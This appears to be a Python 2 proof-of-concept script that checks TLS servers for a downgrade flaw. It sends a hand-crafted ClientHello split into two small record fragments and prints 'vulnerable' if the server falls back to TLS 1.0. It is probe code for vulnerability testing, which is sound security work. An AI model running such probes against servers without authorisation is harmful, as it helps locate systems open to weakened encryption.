import sys
import socket
import struct


HOST = sys.argv[1]
PORT = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# TLSv1.1 ClientHello
hsk_data="\x16\x03\x02\x00\xea\x01\x00\x00\xe6\x03\x02\x56\x58\x38\x03\x99\x03\x78\x90\x87\x8f\xb5\xf9\xfe\xb5\x38\x7e\xbd\xa1\x97\x5e\x6b\x12\x50\x0d\x46\xfb\x68\xba\x26\x64\x76\xce\x00\x00\x74\xc0\x14\xc0\x0a\xc0\x22\xc0\x21\x00\x6b\x00\x6a\x00\x39\x00\x38\x00\x88\x00\x87\xc0\x0f\xc0\x05\x00\x3d\x00\x35\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\x0d\xc0\x03\x00\x0a\xc0\x13\xc0\x09\xc0\x1f\xc0\x1e\x00\x67\x00\x40\x00\x33\x00\x32\x00\x9a\x00\x99\x00\x45\x00\x44\xc0\x0e\xc0\x04\x00\x3c\x00\x2f\x00\x96\x00\x41\x00\x07\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\x09\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x00\xff\x01\x00\x00\x49\x00\x0b\x00\x04\x03\x00\x01\x02\x00\x0a\x00\x34\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11\x00\x23\x00\x00\x00\x0f\x00\x01\x01"

fragment1 = struct.pack('>BHH4s', 0x16, 0x0302, 0x4, hsk_data[5:9])
s.send(fragment1)

fragment2 = struct.pack('>BHHH', 0x16, 0x0302, len(hsk_data[11:])+2, 0x0302)
fragment2 += hsk_data[11:]
s.send(fragment2)

server_hello = s.recv(1024)
rec_ver = struct.unpack('>H', server_hello[1:3])[0]
proto_ver = struct.unpack('>H', server_hello[9:11])[0]

if (rec_ver == 0x0301 and proto_ver == 0x0301):
    print "vulnerable"
